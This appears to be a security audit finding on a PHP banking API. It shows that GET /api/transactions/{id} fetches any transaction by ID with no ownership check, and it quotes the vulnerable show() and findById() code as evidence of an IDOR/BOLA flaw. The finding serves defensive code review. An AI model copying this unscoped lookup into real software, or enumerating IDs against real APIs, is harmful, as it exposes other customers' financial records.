The full source-to-sink path is verified. Router.php registers `GET /api/transactions/{id:\d+}` with only `'auth' => true` (requires a valid authenticated session) and maps it to TransactionController::show. show() takes $vars['id'] directly from the route parameter, casts to int, and calls Transaction::findById($id), which executes `SELECT * FROM transactions WHERE id = ?` with no join/filter on the caller's user_id or owned accounts. The result (if found) is passed straight to Transaction::format() and returned via Response::success(), exposing from_account_id, to_account_id, to_bsb, to_account_number, amount, description, receipt_number, etc. There is no ownership/ACL check anywhere in this call chain. This is in clear contrast to index(), which explicitly calls Account::findByIdAndUser($accountId, $userId) to enforce that an account_id filter belongs to the authenticated user, and to findByUser() which joins accounts on user_id. No such check exists for the single-record lookup by transaction id. Any authenticated user (regardless of which accounts they own) can enumerate sequential transaction IDs via GET /api/transactions/{id} and retrieve every other customer's transaction records — a textbook BOLA/IDOR (API1:2023). No middleware, ORM-level scoping, or secondary check mitigates this in the code reviewed.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);
    if (!$txn) { Response::notFound('Transaction not found.'); }
    Response::success(Transaction::format($txn));
}

// Transaction::findById has no user scoping:
public static function findById(int $id): ?array
{
    $db = Database::getInstance();
    $stmt = $db->prepare('SELECT * FROM transactions WHERE id = ?');
    $stmt->execute([$id]);
    $txn = $stmt->fetch();
    return $txn ?: null;
}
```
